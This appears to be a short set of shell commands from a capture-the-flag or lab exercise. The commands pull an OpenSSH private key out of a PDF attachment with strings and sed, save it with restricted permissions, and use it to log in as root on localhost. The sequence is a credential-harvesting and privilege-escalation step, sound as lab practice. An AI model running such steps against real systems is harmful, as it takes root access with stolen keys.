cd /home/apprentice

strings attachment.pdf | sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' > id_rsa

chmod 600 id_rsa

head -n 1 id_rsa
tail -n 1 id_rsa

ssh -i id_rsa root@localhost
